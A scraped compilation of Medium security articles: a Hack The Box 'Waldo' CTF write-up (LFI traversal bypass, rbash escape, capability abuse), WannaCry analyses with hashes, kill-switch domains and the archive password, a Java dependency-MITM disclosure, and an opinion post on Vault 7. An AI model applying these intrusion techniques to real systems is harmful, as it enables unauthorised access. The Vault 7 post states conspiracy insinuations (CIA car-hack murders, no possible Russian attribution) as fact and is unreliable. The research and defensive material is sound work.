The CIA intentionally uses Russian malware and disguises their tracks to look like Russians. Here is the link to the article on how to hide your tracks and look like the Russians. In these instructions for hiding your origins, we read “DO NOT leave dates/times such as compile timestamps, linker timestamps, build times, access times, etc. that correlate to general US core working hours (i.e. 8am-6pm Eastern time).” More of those in that same link.
Meanwhile, the Department of Homeland Security (DHS) in their joint statement on Russian hacking, said, “. . . are consistent with the methods and motivations of Russian-directed efforts. These thefts and disclosures are intended to interfere with the US election process. Such activity is not new to Moscow — the Russians have used similar tactics and techniques across Europe and Eurasia, for example, to influence public opinion there. We believe, based on the scope and sensitivity of these efforts, that only Russia’s senior-most officials could have authorized these activities.”
So, who are you going to believe, the DHS or your own eyes? There is no such thing as evidence “consistent with the methods” of the Russians because those same methods are consistent with the CIA.
In the FireEye report commissioned to prove Russian hacking, we read, “The second was that malware compile times from 2007 to 2014 corresponded to normal business hours in the UTC (+) 4 time zone, which includes major Russian cities such as Moscow and St. Petersburg.” Right, just as the CIA instructed their hackers to do.
The FBI in their report “GRIZZLY STEPPE — Russian Malicious Cyber Activity” said, “The U.S. Government confirms that two different RIS actors participated in the intrusion into a U.S. political party. The first actor group, known as Advanced Persistent Threat (APT) 29, entered into the party’s systems in summer 2015, while the second, known as APT28, entered in spring 2016.” The systems were old Russia malware, as reported here.
Old, well-known Russian malware is just what the CIA would use. “The CIA’s Remote Devices Branch’s UMBRAGE group collects and maintains a substantial library of attack techniques ‘stolen’ from malware produced in other states including the Russian Federation.”
We can now say that the “Russia did it” story is over in anything other than an “alternative fact” universe. There is not now nor will there ever be any evidence that Russia gave the Podesta and DNC leaks to Wikileaks. If Russia influenced the 2016 US election, they did it some other way, without Wikileaks, without revealing Podesta’s emails.
Can the CIA murder anyone at any time by turning their own car against them? Michael Hastings was investigating the CIA, then died in a car crash. And then there is this:
Have you seen this Kennedy quote? “I will splinter the CIA into a thousand pieces and scatter it into the wind.” — John F. Kennedy
It’s been pretty prominent today and it is a real quote. The writers of this 1966 New York Times article got the quote from someone in the Kennedy administration. He was really murdered and the idea that the CIA did it is tin-foil hat stuff… like the CIA listening to you through your television, which they can do right now.
I didn’t think too much about the Kennedy assassination until that quote popped up. I am agnostic on whether or not the CIA killed Kennedy. They might have. It would not be the first democratically elected leader they killed. I dug out the original article with the “scatter to the wind quote,” from April 1966 from the front page of the New York Times. You should read the entire article. It’s amazing. No such intelligent, fair reporting is likely to appear in the New York Times today. Instead of a critical and fair consideration of all possibilities, otherwise known as journalism, the NYT today puts out propaganda like this.
This Vault 7 release confirms the seemingly obvious statement by John McAfee back in December: “if it looks like the Russians did it, then I can guarantee you it was not the Russians.”
With 70 billion dollars in the budget, the CIA can give money to Amazon to buy the Washington Post and pay software developers to let them in.
Written by
","['about', 'Subscribe ', 'Cybersecurity', 'Russia']"
Waldo Write-up (HTB) - CTF Writeups - Medium,https://medium.com/ctf-writeups/waldo-write-up-htb-dfbaaaa91282?source=tag_archive---------8-----------------------,"This is a write-up for the recently retired Waldo machine on the Hack The Box platform. If you don’t already know, Hack The Box is a website where you can further your cybersecurity knowledge by hacking into a range of different machines.
As opposed to the more generic two-stage boxes, Waldo was unique in that there were three challenges to overcome, and each had completely different methods needed to do so. Whilst the third stage was a little tedious and hard to explain, I learnt about some small Linux functions that I never knew existed before.
The usual nmap scan reveals three open ports:
Seeing as the SSH protocol is fairly up-to-date (and there are very few sun-answerbook enumeration tools), we can assume that this will be a web application attack.
When visiting the website, we are shown a (very gross) list manager:
As shown in the gif, we have a few different functions:
With this in mind, let’s take a look at some of the requests in Burp Suite.
Attempting to open up the first list produces this request:
And, similarly, attempting to open up a list (within the first list) produces this request:
We can see from this that we are querying the dirRead.php and fileRead.php pages, with the file parameter being posted. Since we are looking for a way to get into the system, attempting directory traversal to find important system files through LFI seemed like a good idea.
As such, I tried performing simple directory traversal on the dirRead.php page, which showed us the following:
As shown, we now have access to all files in the above directory. Let’s now try going back another directory, so that we can access more sensitive files:
Okay, so it seems that we can’t traverse back any more. We can assume that some form of input sanitization is taking place, and so we can try some simple bypasses. After only a couple of attempts, I found this, which outlines a method where we can bypass the input sanitization by using “…/…//”, instead of “../../”:
We now have successful directory traversal! As such, we can swap over to fileRead.php requests in order to read the contents of files:
Since this process of changing directories is a little tedious, I wrote a script to help us explore the file system. While this is completely pointless and genuinely a huge waste of time, I did it anyway (I guess I have too much free time?).
I’m not going to go over the code, but it essentially lets us use cd, ls and cat to explore the filesystem. Since we want to upgrade to a “proper” shell, let’s go and find the user’s SSH key.
Sidenote: Whenever I am in a situation where we have read-only access to a system, I refer to this article, since it outlines many important files.
We now know that the user is called nobody, and we have their relevant SSH key (although we could have found this through /etc/passwd anyway). With this in mind, we can SSH in, and obtain the user flag:
This next part was difficult, as I didn’t know what to look for. I ran the usual enumeration scripts, and looked through open ports/SUID files, however found very little.
Eventually, I decided to just list all files created by waldo, so that I could comb through them to find any useful information:
You can find a breakdown of this find command here.
From this, the .monitor file sticks out, since it isn’t a regular .ssh file. Upon opening, we can see that this is another SSH key:
We can assume that this is a key for a user called “monitor”, and as such we can SSH back in as this user:
Unfortunately, there was still more to do before we could fully act as this user.
As shown, we’re actually in an rbash (restricted bash) shell, which meant that our actions were extremely limited. I checked out GTFObins to see if rbash was exploitable, but it wasn’t there.
Listing the files in bin reveals that “red” (restricted ed) is present. When I did this bix, GTFObins didn’t have a page for red, so I checked the page on ed instead:
Let’s just run this command:
Since we can now cd, it seems like we have escaped the shell!
I later learnt that this was not the only way to escape this shell. By directing the SSH traffic through netcat, we can choose the shell we want. As such, we could then catch the shell, and specify our shell type as bash. If this doesn’t make any sense, take a look at this gif, which goes over this process:
Although this method wasn’t necessary, it’s still a good thing to note for future boxes.
Now that we have a shell, let’s look around the filesystem. The first two folders that we are presented with are app-dev and bin.
The bin folder contains the binaries that we were allowed to use before, and so there’s little use enumerating that further. However, the app-dev folder is full of interesting files:
Let’s begin by taking a look at the source code for the logMonitor program, which seems to be logMonitor.c:
I’ve redacted large repeated parts of this file to save space.
We can gather from this that the script is used to read out the contents of various log files in the system. However, from what I can tell, this is pretty secure.
Let’s now try running this script to view some logs:
It looks like we don’t actually have the correct permissions to view these logs.
After messing around with this file for a bit, I decided to explore the v0.1 directory:
Here we see a separate logMonitor program, with slightly different permissions than the other. Let’s now try running this, and search for some logs:
So, this script has permission to read the logs, whereas the other script doesn’t!
Let’s take another look at the separate file permissions:
Despite the write permissions being different, the others all look the same. I then checked the permissions for the v0.1 directory, but those seemed pretty normal too.
It was at this stage that I spent a few hours trying to figure out just how this file has the permission to actually run. There was so SUID trickery going on, and no strange inheritance permissions.
Eventually, I came across a brief mention of file capabilities, which is a way of setting very precise permissions on a certain file. These are often used as a more secure version of SUID, as more delicate control is given to the file. This sounded plausible for us, and so I checked the capabilities of the binaries like so:
We can see here that the logMonitor-0.1 file has the cap_dac_read_search capability, which allows it to read/search all files on the system. The “ei” flag then the capability is (e) effective (as in currently active) and (i) gives this permission to any child processes spawned.
The inheritance flag looked interesting, and so I tried unsuccessfully to force the binary to spawn another binary (that we control) as its child.
I eventually decided to have a look for any more files with similar capabilities:
It looks like tac has the same capabilities as logMonitor-0.1!
If you don’t already know, tac has the same functionality as cat, but reads through files line-by-line backwards. Therefore, we should be able to use it to read the flag:
And with that, the box has been completed!
Contact me:Personal WebsiteTwitterGithubHack The Box
Written by
","['All CTFs', 'ReplyCTF 2018', 'George Omnet', 'Writeup', 'Cybersecurity', 'Ctf']"
WannaCry — Decrypting files with WanaKiwi + Demos - Comae Technologies,https://blog.comae.io/wannacry-decrypting-files-with-wanakiwi-demo-86bafb81112d?source=tag_archive---------3-----------------------,"Read More: Part 1 — Part 2 — Part 3 — Part 4 — @msuiche (Twitter)
DO NOT REBOOT your infected machines and TRY wanakiwi ASAP*!*ASAP because prime numbers may be over written in memory after a while.
Here.
You just need to download the tool and run it on the infected machine. Default settings should work.
Usage: wanakiwi.exe <PID>- PID (Process Id) is an optional parameter. By default, wanakiwi automatically looks for wnry.exe or wcry.exe processes so this parameter should not be required. But in case, the main process has a different name this parameter can be used as an input parameter.
UPDATE: Actually, wanakiwi from Benjamin Delpy (@gentilkiwi) works for both Windows XP (x86 confirmed) and Windows 7 (x86 confirmed). This would imply it works for every version of Windows from XP to 7, including Windows 2003 (x86 confirmed), Vista and 2008 and 2008 R2. See demos in the below GIFs.
Yesterday, Adrien Guinet published a tool called wannakey to perform RSA key recovery on Windows XP. His tool is very ingenious as it does not look for the actual key but the prime numbers in memory to recompute the key itself. In short, his technique is totally bad ass and super smart.
Unfortunately, this only works on Windows XP as those values are cleaned during the CryptReleaseContext in later version of Windows.
UPDATE: Forget the above statement, this has been successfully tested with wanakiwi up to Windows 7.
As Adrien stated in his README, this is not a mistake from the author but an issue with Windows XP — the author themselves make sure to release the user key as soon as they are done with it. And that key never touches the disks unless encrypted with the attacker public key.
Although, some file format issue happened with the exported key that didn’t make it compatible with other tools such as wanadecrypt from Benjamin Delpy (@gentilkiwi) on Windows XP, as the Windows Crypt APIs on Windows XP are expecting a very strict input to work unlike Windows 10. Which is the reason why my initial tests failed with the output key using Wannakey.
Moreover, the output file format was not compatible with the ransomware WannaCry either. Unlike Wanakiwi from gentilkiwi as we can see in the demo below.
After, doing some tests and discussing with Benjamin —we acknowledged the need for a complete end to end utility.
Then, Benjamin started to write his own version using OpenSSL and based on Adrien’s methodology to retrieve the key from the memory and our common research material on the decryption that we accumulated over the week on the internals of the malware when we both reversed WannaCry and our notes that enable a fix for the file format issues and build a version 100% compatible with Windows O.S. from Windows XP to Windows 7.
After troubleshooting the tool together we got a working version across multiple Windows versions.
Amazing job from Benjamin, it was lot of fun to collaborate on this with him.
(see below for full working demos!)
Wanakiwi also recreates the .dky files expect from the ransomware by the attackers, which makes it compatible with the ransomware itself too. This also prevents the WannaCry to encrypt further files.
After further testing with Benjamin, we noticed the info leak on the prime numbers in the Microsoft Crypt API was still present on Windows 7. \o/
As explained above this method relies on finding prime numbers in memory if the memory hasn’t be reused — this means that after a certain period of time memory may get reused and those prime numbers may be erased. Also, this means the infected machine should not have been rebooted.
Also, this tool so far only works on Windows XP due to a flaw present with the CryptReleaseContext implementation. This is a great step forward.
UPDATE: Forget the above statement ! This works from Windows XP to Windows 7, and as you can see on the above screenshots, it had been tested!
Today (19 May) marks the 7th infection day (started on the 12th)— which means that many users would potentially lose their files forever from today as stated in the initial infection window.
The clock is currently ticking for many users around the World.
The infection wave is far from being over, we noticed an important and abnormal spike of activity on our kill-switch from Malaysia during the night (3 AM to 5 AM GST) that resulted in almost half of the total 10K machines we prevented from infection over the past 24 hours.
Kudos to the French security researchers Adrien Guinet and Benjamin Delpy (@gentilkiwi) for their fantastic work. Once again this proves how important collaboration between parties is and how important the contribution from the community is.
Download gentilkiwi’s wanakiwi here.
Written by
","['Products', 'Labs', 'Events', 'Hire Comae', 'Security', 'Wannacry', 'Cybersecurity', 'France']"
WannaCry — New Variants Detected! - Comae Technologies,https://blog.comae.io/wannacry-new-variants-detected-b8908fefea7e?source=tag_archive---------4-----------------------,"Read More: Part 1 — Part 2 — Part 3 — Part 4 @msuiche (Twitter)
UPDATE: Latest development (15May): Attribution and links to Lazarus Group
UPDATE2: — Decrypting files
As a follow-up article on WannaCry, I will give a short brief about the new variants found in the wild, not for experimentation but on infected machines today.
In short, one is a false positive some researchers uploaded to virustotal.com and the other is legit but we stopped it when I registered the new kill-switch domain name.
Update: At the time the below twitt was posted, the above stopped ~10K machines from 76 different countries to spread the infection from the new variant.
On Friday 12 May 2017, MalwareTechBlog registered the first kill switch (iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com) that enable to slow down the infection rate of WannaCry ransomware. This is 24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c.
Today (14 May 2017), 2 new variants appeared. One working which I blocked by registering the new domain name, and the second which is only partially working because it only spreads and does *not* encrypt files due to a corrupted archive.
All the variants in the wild are the following:
As seen below, this is the new kill switch address (ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com) found in the 32f24601153be0885f11d62e0a8a2f0280a2034fc981d8184180c5d3b1b9e8cf sample, shared by @benkow_ with me via his honeypot VM. It took me less than a minute once I had the new sample to reverse it and extract the new address to register it.
The variants 24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c & 32f24601153be0885f11d62e0a8a2f0280a2034fc981d8184180c5d3b1b9e8cfboth drop the same files and archives.
Kaspersky told me they also detected the above variant, MD5:d5dcd28612f4d6ffca0cfeaefd606bcf was first seen by one of their users in Russia 01:53:26 GMT (2017–05–14 01:53:26.0)
Costin Raiu, Director of Global Research and Analysis Team at Kaspersky Lab, shared the 07c44729e2c570b37db695323249474831f5861d45318bf49ccf5d2f5c8ea1cd sample with me for a second opinion.
As said in the introduction, Although, this build does only work *partially* as the ransomware archive is corrupted but the spreading part using ETERNALBLUE and DOUBLEPULSAR still works. Archive only is partially uncompressed. Although the password in the code is the same.
The above variant, MD5:d724d8cc6420f06e8a48752f0da11c66, has not been seen by any of Kaspersky’s users. (nobody got hit with it yet). It was first scanned on VT at: 2017–05–14 13:05:36.
This sample had been discovered after the initial variant I received today. See below my analysis.
I concluded this sample with no killswitch had been patched and not compiled for two reasons:
This variant drops different files. I’m still analyzing what is different between the two versions.
As reported I reported to the New York Times on Friday, new variants were to be expected.
The fact the no kill-switch variant is only partially working is most likely a temporary mistake from the attackers. Remember, even though the ransomware decompression is not working — the spreading through ETERNALBLUE & DOUBLEPULSAR is still working.
The fact I registered the new kill-switch today to block the new waves of attacks (sinkhole.tech reported to me they are receiving hits) is only a temporarily relief which does not resolve the real issue which is that many companies and critical infrastructures are still dependent on legacy and out of support Operating Systems.
Written by
","['Products', 'Labs', 'Events', 'Hire Comae', 'caught', '@benkow_', 'Security', 'Comae Labs', 'Wannacry', 'Cybersecurity']"
WannaCry — The largest ransom-ware infection in History,https://blog.comae.io/wannacry-the-largest-ransom-ware-infection-in-history-f37da8e30a58?source=tag_archive---------0-----------------------,"Read More: Part 1 — Part 2 — Part 3 — Part 4 — @msuiche (Twitter)
UPDATE: Latest development (15May): Links to Lazarus Group
UPDATE2: — Decrypting files
IMPORTANT NOTE: Microsoft released an emergency patch (KB4012598)for unsupported version of Windows (Windows XP, 2003, Vista, 2008). APPLY NOW!
NOTE2: On Sunday 14 May, We just stopped the second wave of attack by registering a second killswitch but this is temporary. Read more.
On Friday 12th May 2017, a ransom-ware called WannaCry infecting and spreading machines in 70+ countries — using nation state grade offensive capabilities released last month by the ShadowBrowkers — including telco companies like Telefonica in Spain, or healthcare authority like the NHS in England — and the number of infected machines keeps growing.
This ransom-ware supports 28 different languages, encrypts 179 different type of files and requires victims to wire money ($300-$600) over bitcoins in order to get the control back of their machines.
Main dropper/encrypter: ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa
It is believed the ransom-ware used an SMB vulnerability patched by Microsoft (MS17–010) in March. A public exploit for this vulnerability had been released in April by a group subbed as ShadowBrokers (which emerged for the first time in August 2016) while leaking files containing offensive tools belonging to the NSA including a remote SMB exploit called ETERNALBLUE which affects the above vulnerability.
This vulnerability is believed to have been used by the NSA to take over their targets including the backbone of financial institutions in the Middle East.
Last month, I covered the latest Shadow Brokers leak — which I strongly recommend to read to learn more about what ETERNALBLUE and DOUBLEPULSAR are.
Thanks to Darien Huss for highlighting the binary that infects the system, Zammis Clark wrote a good write-up on the infection part and the domain name www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com that was register as part of a kill switch for the malware.
Below is the most interesting discovery form Darien Huss, which enabled @MalwareTechBlog to register the domain name to prevent further infection — for now. Although, it is important to note that:
I was curious on the DOUBLEPULSAR part, so I decided to look in details at the routine — WannaCry not only check if DOUBLEPULSAR is present but also has a (unused) flag to potentially uninstall the backdoor and kick any parasite out.
Without any surprised, the packets and checks are very similar to the DOUBLEPULSAR detection tool written by countercept.
You can find out more about the references to DOUBLEPULSAR within WannaCry here.
The dropper extracts a password protected (“WNcry@2ol7”) archive containing the ransom-ware from its resources (XIA/2058).
The ransom-ware uses 3 different addresses to receive payments:
Tor Endpoint Addresses recovered from the configuration file :
The malware also downloads the version 0.2.9.10 of tor browser: https://dist.torproject.org/torbrowser/6.5.1/tor-win32-0.2.9.10.zip
Here is the list of the 179 different type of files encrypted by the ransom-ware.
APPLY MS17–010 NOW if you didn’t !
If you are using unsupported versions of Windows such as XP and Vista, you are in big trouble and should do a crisis meeting now. This is going to be a very long week-end for a lot of companies around the World.
It had been reported/rumored that the initial attack vector (pre-SMB) comes from file attachments over emails, make sure to tell your employees to not open suspicious documents.
Written by
","['Products', 'Labs', 'Events', 'Hire Comae', 'KB4012598', 'Security', 'Wannacry', 'Smb', 'Cybersecurity', 'Comae Labs']"
Want to take over the Java ecosystem? All you need is a MITM!,https://medium.com/bugbountywriteup/want-to-take-over-the-java-ecosystem-all-you-need-is-a-mitm-1fc329d898fb?source=tag_archive---------2-----------------------,"What started as a simple vulnerability report for a small project, quickly unearthed an industry-wide security vulnerability impacting huge swaths of the Java Virtual Machine (JVM) development ecosystem.
This work builds off of the excellent 2014 writeup by Max Veytsman titled: “How to take over the computer of any Java (or Closure or Scala) Developer”.
Back in 2014, when it was published, the Maven Central Repository, run by Sonatype, didn’t support SSL (HTTPS) for serving JAR files. Thanks to Max’s writeup, Sonatype fixed this within only a few days. I highly recommend that you at minimum skim his writeup before continuing. Even though it’s been 5 years since his writeup was published, his warning still holds true, and now applies to Kotlin and Groovy developers as well.
This time, however, it’s not because of a lack of support for HTTPS by repository hosts; this time it’s because of a widespread single character typo that to this day leaves tens of thousands of open source projects vulnerable.
In his writeup, Max introduced a tool called Dilettante, “a man-in-the-middle proxy that intercepts JARs from [any artifact repository] and injects malicious code into them.” “Proxying HTTP traffic through dilettante will backdoor any JARs downloaded from [the artifact repository].”
Dilettante is a simple POC, all it does is cause Java to render a picture of a cat on your screen. But this very simple technique could be used to maliciously compromise huge swaths of the Java ecosystem. The only prerequisite is that the project is downloading its dependencies over HTTP instead of HTTPS.
HTTPS doesn’t just encrypt the traffic between the client and the server, it also provides a cryptographic guarantee that the client is communicating with the server requested and not a MITM imposter.
This research started when I found that in my own build I was using HTTP because of a single artifact.
I figured out the root cause was due to a copy & paste from the Ktor repository. Digging into the history of the Ktor repository I found that until recently Ktor was using HTTP to resolve dependencies. One thing to note is that Ktor is an official JetBrains library. This incident made me curious, so I started looking for it elsewhere.
Long story short; some of the most popular JVM based projects on GitHub were or still are vulnerable.
Note: Projects marked ‘Done’ as ‘TRUE’ have completely fixed the issue and have either audited or have a CVE number issued for their previous releases.
Here’s a direct link to the Google Sheets for those who are interested.
In addition to the projects listed above, there are some big communities and organizations that this vulnerability also impacted.
This was the first place I began looking and was unsurprised to immediately start finding this vulnerability in the build infrastructure in almost all of the Minecraft mods I looked at.
Thinking that there was a chance that the Ktor incident wasn’t just a one-off incident, I started looking at the JetBrains GitHub projects.
Kotlin Compiler
Kotlin is a programing language developed by JetBrains that compiles to the JVM, LLVM, and Javascript. It has gained significant popularity with Android developers. Google has recently designated that Kotlin is now the preferred language for Android development.I found multiple instances across the Kotlin compiler codebase where the build infrastructure and tests were downloading dependencies over HTTP. Not only were the Kotlin compiler’s source dependencies vulnerable, but vulnerable repositories were also used for the Gradle buildscript classpath leaving open the potential for release artifacts to have been compromised. If this weren’t bad enough, the buildscript classpath was also used to resolve the previous version of the Kotlin Compiler thus leaving the compiler open to the ‘Trusting Trust’ attack (see more on this below).
IntelliJ IDEANot only was IntelliJ and several of the official plugins vulnerable to this, but there were many cases where the code generators for creating starter projects with IntelliJ generated projects that are vulnerable.
Gradle was an interesting case. As a contributor to Gradle, you would not have been impacted by this vulnerability, however, when Gradle was used to build the Gradle repository on Gradle Inc’s Team City CI infrastructure, that infrastructure overrode the defaults to instead use a corporate JFrog Artifactory instance that served artifacts over HTTP. Thankfully, this infrastructure is colocated on the same network as the Gradle JFrog Artifactory server.
That being said, the Gradle corporate JFrog Artifactory server was mirroring other artifact servers over HTTP thus potentially exposing those mirrors to a MITM based cache poisoning attack.
As of writing this, the Elastic Search repository has 38.6k stars, thus making it the most stared Java-based project on GitHub. The main Elastic Search project has had over 1.1k contributors. The test logic in the Elastic build was determined to be vulnerable to this.
I found this vulnerability in several of the Apache Software Foundation projects. The notable ones are listed below.
As of the publication date of this article, the Apache Software Foundation has decided not to issue CVE numbers for the impacted projects even though, in most cases, no audit was performed to determine if these projects were maliciously compromised by this vulnerability.
Groovy Compiler
Apache Groovy, one of the most popular alternatives for developing for the JVM was also found to be vulnerable to this. As of writing this, Groovy is the 19th most popular programing language in the world according to the Tiobe index. Similar to Kotlin, the Groovy compiler’s buildscript classpath had dependencies resolved over HTTP. This also left open the potential for release artifacts to have been compromised.
Thankfully, the Groovy compiler is built with a bootstrap compiler written entirely in Java, thus making the potential for the ‘Trusting Trust’ attack very small.
Additionally, the Groovy-Eclipse Plugin was also found to be vulnerable.
HadoopApache Hadoop has over 193 contributors, making it the project with the most contributors. All of those contributors who ran the Hadoop build on their machines could have been compromised by a MITM.
KafkaApache Kafka was originally written by the LinkedIn team to be a fast Event Broker. LinkedIn has used Kafka internally to ingest over 1 trillion messages per day. I found that Kafka’s build system was loading Gradle Plugins over HTTP instead of HTTPS.
Other Apache ProjectsThe list of Apache projects that I found that were vulnerable include but are not limited to the following: Casandra, Geode, Storm, Bigtop, Fink, OpenJPA, Royal Compiler & Airavata.
Over 1,000,000 Jenkins users worldwide make Jenkins the most widely-used, open source automation server.- Jenkins Community Announces Record Growth and Innovation in 2017
Jenkins is used as a self-hosted CI pipeline to automate building and testing software.
Jenkins and many of the Jenkins official plugins all ships with dependencies that were downloaded over HTTP.
The first location that I found was in the spring-security-oauth project. The Spring project was the first Maven based project I started looking at, forcing me to establish a whole different search methodology for inspecting Maven POM files with the GitHub search functionality. Once I started looking, I found that this vulnerability existed in many of the other projects under the Spring organization.
The Spring Team responded immediately to the vulnerability and began patching all of their projects. Due to the overwhelming number of Pivotal projects impacted, Pivotal developed a tool to find and replace all uses of HTTP across the repository. That tool can be found here:
This vulnerability also impacted many projects maintained by Red Hat. These projects include but are not limited to Hibernate ORM, RestEasy and many projects in the Wildfly (formerly JBoss) ecosystem.
Similar to Red Hat & Apache Foundation, this also impacted the Eclipse Foundation projects Vorto, Buildship, xtext, Orion & Birt.
This vulnerability additionally impacted a few of Oracle’s open source projects including VisualVM, PGQL, OpenGrok & Helidon.
A few very popular JVM testing libraries and frameworks were also vulnerable to this including TestNG, Spock & PowerMock.
Other projects this vulnerability was discovered in include Grails, the Scala module for FasterJacksonXML & Ehcache3. Additionally, I found this vulnerability in the Open Source projects of Netflix, Google, Twitter, the National Security Agency (NSA), Stripe, Gluon (Scene Builder) PortSwigger, Black Duck, Snyk, LinkedIn, and PayPal. Ironically, when this was reported to PayPal’s security team, they closed it as they consider MITM attacks ‘out of scope’ for their HackerOne program.
My initial research into how common MITM attacks were actually stemmed from my research into maliciously compromising XML parsers that loaded DTD files loaded over HTTP in order to achieve XXE. More on this topic in a future writeup. What I found was quite alarming.
To my surprise, Internet Service Providers (ISPs) seem to be doing this quite regularly.
Comcast began injecting 400+ lines of JavaScript code in to pages I requested on the internet so that when the browser renders the web page, the JavaScript generates a pop up trying to up-sell me a new modem.- Comcast continues to inject its own code into websites you visit
Bharat Sanchar Nigam Limited (BSNL) an ISP in India also has a history of injecting Ads into their user’s webpages when those pages are loaded over HTTP.
This indicates that the infrastructure already exists and could be re-targeted to impact JAR files.
When malicious actors gain access to a system, they often quickly utilize their new foothold to establish a MITM. Every year, Verizon releases a Data Breach Investigation Report (DBIR) which analyzes the various attack vectors that were most commonly exploited each year. This is a quote from one of their reports.
ActionsThe top three threat action categories were Hacking, Malware, and Social. The most common types of hacking actions used were the use of stolen login credentials, exploiting backdoors, and man-in-the-middle attacks.
- Verizon 2011 Data Breach Investigations Report; Page 69
To quote from the analysis from this report:
I infer that it’s a secondary action used once somebody has a foothold in the system, but the Dutch High Tech Crime Unit’s data says it’s quite credible for concern. Of the 32 data breaches that made up their statistics, 15 involved MITM actions.- Answer: Stack Exchange: Are “man in the middle” attacks extremely rare?
MITM attacks should be considered a credible threat in software security.
Setting aside all of these other attack vectors, any developer working on any of these projects over a public WiFi connection has opened up their computer to the potential for malicious compromise. This attack was demonstrated with the famous Firefox plugin Firesheep.
The potential compromise of a WiFi hotspot can have a significant impact on developers themselves since many developers work over WiFi at coffee shops, at developer conferences, etc. All it would take is a WiFi Pineapple and a dependency that hasn’t already been cached to infect a developers machine.
Due to the Snowden Revelations, we now understand the various methodologies used by the US Government’s three letter agencies to perform MITM attacks against US citizens.
To trick targets into visiting a FoxAcid server, the NSA relies on its secret partnerships with US telecoms companies. As part of the Turmoil system, the NSA places secret servers, codenamed Quantum, at key places on the Internet backbone. This placement ensures that they can react faster than other websites can. By exploiting that speed difference, these servers can impersonate a visited website to the target before the legitimate website can respond, thereby tricking the target’s browser to visit a Foxacid server.- How the NSA Attacks Tor/Firefox Users With QUANTUM and FOXACID
There has also been a history of internet traffic being routed through foreign countries due to misconfigured BGP routes.
Let’s look at some stats for the most commonly used repositories loaded over HTTP. Please notes that these numbers aren’t exact and may be slightly inflated because GitHub’s search functionality is fuzzy in nature.
Maven Central is the most popular artifact server used in the JVM ecosystem and is the default artifact server used by Maven. Maven Central was the first major player in the JVM artifact hosting space.
JCenter is a superset of Maven Central. Developers that publish to JFrog Bintray can request that their artifacts get mirrored here.
JFrog Bintray allows developers to create their own artifact servers for free for open source projects.
Clearly, this is a widespread security vulnerability across both Gradle and Maven projects.
As a thought experiment, I drafted the idea for abusing this MITM vulnerability to create a Java Library Worm. The results of this thought experiment can be found here.
The TL;DR is this:
The consequences of this vulnerability are that a MITM of dependences used during a release could allow malicious code to maliciously compromise the artifacts produced by the build, thus infecting downstream users.
For libraries that have already been published, there’s not much that can be done unless these projects builds are completely reproducible. For the compilers vulnerable to this (Kotlin), the test libraries that are used to test themselves (Spock and TestNG), and build tools used to build themselves (Gradle), this may be an issue because of the chain of trust has been broken. Most compilers are used to compile themselves. For more on this topic see the relatively short paper by Ken Thompson titled “Reflections on Trusting Trust”.
I think that build tools like Gradle, Maven, and SBT need to require users to explicitly opt-out of using HTTPS to resolve their dependencies. This will force users to make their intention to use an insecure protocol explicit thus preventing casual typos. I have a proposal open with both Gradle and Maven to implement this functionality. You can find those proposals below. Please go upvote them there!
The nohttp tool developed by Pivotal looks for all occurrences of HTTP except those that are whitelisted (i.e. XML namespace names). This will ensure that HTTP doesn’t cause issues in other places (i.e. Gradle Wrapper location, DTD declarations, etc). It can find HTTP occurrences, replace occurrences, and integrates with a build to ensure that HTTP is not used in the future.
As the scope of this vulnerability got bigger, I quickly realized that some of the responsibility for this vulnerability fell with the artifact hosts like Maven Central and JCenter. I reached out to the two largest artifact hosts Sonatype (Maven Central), JFrog (JCenter) as well as smaller hosts like Pivotal (Spring), The Eclipse Foundation, Jenkins, Red Hat & JetBrains and asked if they would like to join an initiative to completely block download requests made over HTTP starting January 15th, 2020.
25% of Maven Central downloads are still using HTTP
Soon after this announcement both JFrog and Pivotal informed me that they will be following suit.
You can find the Maven Central announcement here.
Given how many widely used open source projects that I found this vulnerability in, I would advise anyone developing software for the JVM to go check their build logic for repositories resolving dependencies over HTTP.
For Gradle, you are looking for a repository configurations like this.
Gradle developers may also want to check any init.gradle scripts that are distributed internally at their company but are not normally checked into source control.
For Maven-based projects, you are looking for repository configurations like this.
Maven developers should also check the configuration in their ~/.m2/settings.xml file as that’s normally where credentials for repositories are configured.
Additionally, corporate users of JFrog Artifactory or Sonatype’s Nexus should check the configuration of their servers to see if they are mirroring other artifact servers over HTTP.
I’ve reached out to Sonatype and JFrog and asked that in future updates they begin warning their users/admins of insecure configuration.
JFrog has responded that this functionality is now officially part of their roadmap but they don’t have a planned release date yet.
The entire machine (developer machines, build boxes, etc) that executed the potentially malicious jar should be considered potentially compromised. This also means that anything that machine has access to (other projects, credentials, other hosts, etc) should also be considered potentially compromised. Shared artifact caches like the ~/.gradle and ~/.m2 directories where Gradle and Maven cache artifact should be considered compromised and should be deleted. To avoid a single vulnerable application exposing every project it builds, it is also best practice to try and isolate your builds.
If you are a maintainer of an open source project that was vulnerable to this, you have a responsibility to your users to either audit previous releases for compromise or file for a CVE number to inform downstream users of the potential for compromise.
Unfortunately, I was only able to contact a small fraction of the projects impacted by this vulnerability. Many of the open source projects you rely upon in your own work may be vulnerable to this. If you are able to do so, consider reaching out to projects you find are impacted to help secure the Java ecosystem for all of us.
If you work on open source software or develop software with any of these build tools commercially I also highly recommend that you audit your build for the sake of the integrity of the software supply chain pipeline.
I want to thank all of the truly awesome & professional security teams and project maintainers at all of the organizations I contacted. There’s absolutely no way that I would have been able to patch all of these locations myself. Several of these teams responded within hours of my report and had begun rolling out fixes throughout their code by the next day. Additionally, I want to thank Snyk for agreeing to be the CNA for all of these CVE reports. I also want to thank Max Veytsman for creating Dilettante. Having a POC made the responsible disclosure process much smoother.
If you happen to be a security researcher and want to find these security vulnerabilities in other Java projects that I may have missed here are the Github search queries I used.
If you do find this issue in a project using these queries, please point them back to this article.
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Android', 'Java', 'Cybersecurity', 'Software Development', 'Security']"
